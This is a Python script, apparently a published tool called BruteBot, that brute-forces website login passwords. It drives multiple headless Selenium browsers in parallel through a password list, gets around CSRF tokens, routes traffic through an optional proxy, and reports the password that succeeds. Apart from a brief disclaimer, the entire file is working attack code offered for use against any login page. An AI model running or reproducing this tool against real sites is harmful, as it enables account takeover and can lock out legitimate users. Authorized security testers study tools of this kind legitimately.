#!/usr/bin/env python3

def print_red(colored_text): print("\033[91m{}\033[00m".format(colored_text))


def print_green(colored_text): print("\033[92m{}\033[00m".format(colored_text))


def print_cyan(colored_text): print("\033[96m{}\033[00m".format(colored_text))


def print_yellow(colored_text): print("\033[93m{}\033[00m".format(colored_text))


print_green('''\n[!] Script Author: Navin M. (GitHub handle: navin-maverick).\n
[!] Description: BruteBot has been built upon Python 3.7 & uses 'webbot' (a library derived from Selenium).
Lets you brute-force login passwords. Handy for login pages that have CSRF protection or any random tokens.\n
[!] Disclaimer: Do not run this script on websites that you do not have explicit permissions to assess.
It is considered to be illegal / unethical. I am not responsible for any misuse of this script whatsoever.
=== === === === === === === === === === === === === === === === === === === === === === === === === === ===\n''')

try:
    import os, time, sys, argparse, http
    from webbot import Browser
    from selenium import common
    from threading import Thread, Lock

except ModuleNotFoundError:
    time.sleep(1)
    print_red(
        "[!] Error: Dependent package missing.\n\n"
        "[!] This program requires 'webbot' to run. Please install it & try again.\n\n"
        "[!] To install, type: \033[4;91mpip3 install webbot\033[0;91m\n\n"
        "[!] Exiting program!\n")
    sys.exit()

except KeyboardInterrupt:
    print_red('\n[!] Error: Process interrupted. Exiting program!\n')
    sys.exit()

# Defining few necessary global parameters:
attempt_count = 1
cracked = False
cracked_count = 1
threadLock = Lock()
val1_output = val2_output = ''
alert_prompt_error = True
passwords = []


class ProgramArgs:
    target = ''
    username = ''
    plist_file = ''
    mode = ''
    uid = ''
    pid = ''
    button_name = ''
    time_in_seconds = ''
    proxy = ''

    def passing_args(self):
        usage_syntax = (
            'python3 %(prog)s -t (LOGIN PAGE URL) -u USERNAME -p (PASSWORD LIST) --uid (USERNAME ELEMENT ID)\n\t--pid '
            '(PASSWORD ELEMENT ID) --bname (LOGIN BUTTON NAME) -m (visible / headless) -s (TIME IN SECONDS)')
        usage_example = "Example: python3 BruteBot.py -t https://target-website/login-page -u admin -p passwords.txt" \
                        "\n\t--uid username --pid password --bname 'Log in'"
        mode_desc = '    {visible / headless}. Default mode = headless.\n' \
                    '"visible" mode: You can see the browser performing all steps. Useful while troubleshooting.\n' \
                    '"headless" mode: The browser works behind the scenes. Faster & more effective.'

        class CustomHelpFormatter(argparse.RawTextHelpFormatter):
            def add_usage(self, usage, actions, groups, prefix=None):
                if prefix is None:
                    prefix = 'Usage: '
                return super(CustomHelpFormatter, self).add_usage(
                    usage, actions, groups, prefix)

        # noinspection PyTypeChecker
        parser = argparse.ArgumentParser(formatter_class=CustomHelpFormatter, usage=usage_syntax,
                                         description=usage_example, add_help=False)
        parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS,
                            help='Show this help message and exit.')

        # Defining argument groups (Required & Optional):
        parser._optionals.title = 'Optional arguments'
        optional_args = parser._action_groups.pop()
        required_args = parser.add_argument_group('Required arguments')

        # Required arguments:
        required_args.add_argument('-t', '--target', help='  URL of target website login page.', metavar='\b',
                                   required=True)
        required_args.add_argument('-u', '--uname', help='  Valid username / email.', metavar='\b', required=True)
        required_args.add_argument('-p', '--plist', help='  Password list (must be in the same path as this script).',
                                   metavar='\b', required=True)
        required_args.add_argument('--uid', metavar='\b', required=True,
                                   help="Username Element ID (Use 'Inspect' feature in browser to find this value).")
        required_args.add_argument('--pid', metavar='\b', required=True,
                                   help="Password Element ID (Use 'Inspect' feature in browser to find this value).")
        required_args.add_argument('--bname', metavar='\b', required=True,
                                   help='Name that you see on the login button.')

        # Optional arguments:
        parser.add_argument('-m', '--mode', help=mode_desc, required=False, choices=['visible', 'headless'],
                            metavar='\b', default='headless')
        parser.add_argument('-s', '--time', required=False, default=1, metavar='\b', type=float,
                            help='    Waiting time (in seconds). Default value = 1.\nIncrease this if your page '
                                 'generally takes longer to load because of heavy graphic content.')
        parser.add_argument('--proxy', required=False, default=None, metavar='\b',
                            help='  Option to route the traffic through a proxy. For example, http://localhost:8080.')

        # Initiating parser:
        parser._action_groups.append(optional_args)
        args = parser.parse_args()

        self.target = args.target
        self.username = args.uname
        plist = args.plist
        self.plist_file = os.getcwd() + f'/{plist}'
        self.mode = args.mode
        self.uid = args.uid
        self.pid = args.pid
        self.button_name = args.bname
        self.time_in_seconds = args.time
        self.proxy = args.proxy

        time.sleep(1)


def confirm_action(brutebot):
    print('Below are the parameters configured by you. Please verify.\n')

    # Verifying user input:
    print(f'* Login page URL: \033[96m{brutebot.target}\033[00m\n'
          f'* Username: \033[96m{brutebot.username}\033[00m\n'
          f'* Password list: \033[96m{brutebot.plist_file}\033[00m\n'
          f'* Username Element ID: \033[96m{brutebot.uid}\033[00m\n'
          f'* Password Element ID: \033[96m{brutebot.pid}\033[00m\n'
          f'* Login button name: \033[96m{brutebot.button_name}\033[00m\n'
          f'* Browser mode: \033[96m{brutebot.mode}\033[00m\n'
          f'* Waiting time: \033[96m{brutebot.time_in_seconds} second(s)\033[00m\n'
          f'* Proxy configured: \033[96m{brutebot.proxy}\033[00m'
          f'\n\n'
          f'\033[96m>> Shall we continue?\033[00m\n'
          f'1. Yes\n'
          f'2. No, wait!\n')

    confirmation = input('What would it be? (Enter 1 or 2): ')

    if confirmation == '1':
        print('\n')
        pass

    elif confirmation == '2':
        time.sleep(1)
        print_red('\n[!] OK. Please check & try again.\n\n[!] Exiting program!\n')
        sys.exit()

    else:
        time.sleep(0.5)
        print_red('\n[!] Error: Invalid entry. Please check & try again.\n\n[!] Exiting program!\n')
        sys.exit()


def validate_user_input(brutebot):
    global val1_output, val2_output

    def validate_file(val_brutebot):

        global val1_output, passwords

        try:
            passwords = input_plist(brutebot)
            if not len(passwords):
                print_red(
                    '[!] Error: Provided password list is empty! Please provide a valid password list & try again.'
                    '\n\n[!] Please wait while other parameters are being checked. If everything else is OK, the '
                    'program will exit here.\n\n=== === === === === === === === === === === === === === === === === ==='
                    ' === === === === === === === === === ===\n')
                val1_output = False
                sys.exit()
            else:
                print_green('[!] Password list seems OK. Checking other parameters. Might take a few '
                            'seconds.\n')
                val1_output = True
                sys.exit()

        except FileNotFoundError:
            print_red(
                '[!] Error: Password list not found. Place the password list in the same folder as this script & try '
                'again!\n\n[!] Please wait while other parameters are being checked. If everything else is OK, '
                'the program will exit here.\n\n'
                '=== === === === === === === === === === === === === === === === === === === === === === === === ==='
                '=== === ===\n')
            val1_output = False
            sys.exit()

    def validate_elements(val_brutebot):

        global val2_output

        tmp_driver = Browser(showWindow=False, proxy=brutebot.proxy)
        tmp_driver.go_to(val_brutebot.target)
        time.sleep(val_brutebot.time_in_seconds)

        x = tmp_driver.exists(val_brutebot.uid, css_selector=str('input[type=text][id="{}"]').format(brutebot.uid))
        y = tmp_driver.exists(val_brutebot.pid, css_selector=str('input[type=password][id="{}"]').format(brutebot.pid))
        z = tmp_driver.exists(val_brutebot.button_name,
                              css_selector=str('button[type=submit][value="{}"]'
                                               or 'input[type=submit][value="{}"]').format(brutebot.button_name))

        if x and y and z:
            time.sleep(val_brutebot.time_in_seconds)
            tmp_driver.close_current_tab()
            val2_output = True
            print_green(f"[!] The specified URL and the login page elements seem OK.\n")
            sys.exit()
        else:
            print_red(
                '[!] Error: The specified URL / login page elements could not be found. Please check & try again.\n\n'
                '[!] Exiting program!\n')
            val2_output = False
            sys.exit()

    val1 = Thread(target=validate_file, args=(brutebot,), daemon=True)
    val2 = Thread(target=validate_elements, args=(brutebot,), daemon=True)
    val1.start()
    val2.start()
    val1.join()
    val2.join()

    if val1_output and val2_output:
        pass
    else:
        sys.exit()


def load_animation():
    display_string = "verifying all parameters..."
    display_string_length = len(display_string)

    animation = "|/-\\"
    animation_count = 0
    count_time = 0
    i = 0

    while count_time != 50:
        time.sleep(0.075)
        load_str_list = list(display_string)

        x = ord(load_str_list[i])
        y = 0

        if x != 32 and x != 46:
            if x > 90:
                y = x - 32
            else:
                y = x + 32
            load_str_list[i] = chr(y)

        animation_output = ''
        for j in range(display_string_length):
            animation_output = animation_output + load_str_list[j]

        sys.stdout.write("\r" + animation_output + animation[animation_count])
        sys.stdout.flush()

        display_string = animation_output

        animation_count = (animation_count + 1) % 4
        i = (i + 1) % display_string_length
        count_time = count_time + 1

    if os.name == "nt":
        os.system("cls")

    else:
        os.system("clear")


def display_initiation_msg():
    time.sleep(1)
    print_green('[!] We are good to go!\n')
    time.sleep(1)
    print_yellow('[!] Commencing brute-forcing. Sit back & relax!\n')
    time.sleep(1)


def update_attempt_count():
    threadLock.acquire()
    global attempt_count
    attempt_count += 1
    threadLock.release()


def update_cracked(flag):
    threadLock.acquire()
    global cracked
    cracked = flag
    threadLock.release()


def brute(brutebot, driver, password):
    global attempt_count, cracked, cracked_count

    try:

        if not cracked:

            print(f'Attempt \033[93m#{str(attempt_count)}\033[00m. Password tried: \033[93m{password.rstrip()}\033[00m')
            update_attempt_count()

            driver.go_to(brutebot.target)
            time.sleep(brutebot.time_in_seconds)

            driver.type(brutebot.username, css_selector=str('input[type=text][id="{}"]').format(brutebot.uid))
            driver.type(password.rstrip(), css_selector=str('input[type=password][id="{}"]').format(brutebot.pid))
            driver.click(brutebot.button_name,
                         css_selector=str('button[type=submit][value="{}" ]'
                                          or 'input[type=submit][value="{}" ]').format(brutebot.button_name))

            time.sleep(brutebot.time_in_seconds)

            x = driver.exists(brutebot.uid, css_selector=str('input[type=text][id="{}"]').format(brutebot.uid))
            y = driver.exists(brutebot.pid, css_selector=str('input[type=password][id="{}"]').format(brutebot.pid))
            z = driver.exists(brutebot.button_name,
                              css_selector=str('button[type=submit][value="{}" ]'
                                               or 'input[type=submit][value="{}" ]').format(brutebot.button_name))

            if x and y and z:
                pass
            else:
                update_cracked(True)
                if cracked_count == 1:
                    print_green(
                        f"\n[!] We got a hit! The correct password is \033[5;92m{password.rstrip()}\033[0;92m\n\n"
                        f"[!] URL at the time of hit: \033[4;92m{driver.get_current_url()}\n")
                    cracked_count += 1
                    sys.exit()
                else:
                    sys.exit()

    except common.exceptions.NoSuchWindowException or common.exceptions.WebDriverException:
        pass

    except common.exceptions.UnexpectedAlertPresentException:
        global alert_prompt_error
        if alert_prompt_error:
            print_red('\n[!] Warning: A mandatory alert prompt is disrupting the program execution.\n')
        else:
            pass
        alert_prompt_error = False
        sys.exit()


def feed_passwords(brutebot, initiated_driver, fetched_list):
    for pwd in fetched_list:
        brute(brutebot, initiated_driver, pwd)


def input_plist(brutebot):
    global passwords
    with open(brutebot.plist_file, encoding='utf-8', errors='ignore') as input_file:
        extracted_passwords = list(input_file)
    input_file.close()
    filtered_passwords = [line for line in extracted_passwords if line.strip() != ""]
    passwords = list(dict.fromkeys(filtered_passwords))
    return passwords


def execute_all_threads(brutebot):
    global passwords
    thread_list = []

    if brutebot.mode == 'visible':
        print_yellow("[!] Do not be alarmed if you see a few browser windows open up. DO NOT CLOSE any of them!\n")
        time.sleep(1.5)

    try:

        for i in range(5):
            divided_list = passwords[i::5]
            if len(divided_list) > 0:
                if brutebot.mode == 'visible':
                    new_driver = Browser(showWindow=True, proxy=brutebot.proxy)
                else:
                    new_driver = Browser(showWindow=False, proxy=brutebot.proxy)

                t = Thread(target=feed_passwords, args=(brutebot, new_driver, divided_list,), daemon=True)
                thread_list.append(t)
                t.start()

        for thread in thread_list:
            thread.join()

    except common.exceptions.NoSuchWindowException or common.exceptions.WebDriverException:
        pass

    if (not cracked) and (attempt_count <= len(passwords)):
        print_red('\n[!] Error: Program did not execute properly. Results inconclusive.\n\n[!] Exiting program!\n')
        sys.exit()

    elif (not cracked) and (attempt_count > len(passwords)):
        print_red(
            '\n[!] All passwords exhausted. None of them worked. Sorry!\n\n[!] It could also be that your account '
            'was already locked out after the initial few failed login attempts.\n\n[!] Exiting program!\n')
        sys.exit()


def main():
    # Getting user input:
    brutebot = ProgramArgs()
    brutebot.passing_args()

    # Getting confirmation:
    confirm_action(brutebot)
    load_animation()

    # Validating user input:
    validate_user_input(brutebot)

    # Brute-forcing:
    display_initiation_msg()
    execute_all_threads(brutebot)


try:
    main()


except KeyboardInterrupt:
    print_red('\n[!] Error: Program execution interrupted. Exiting program!\n')
    sys.exit()
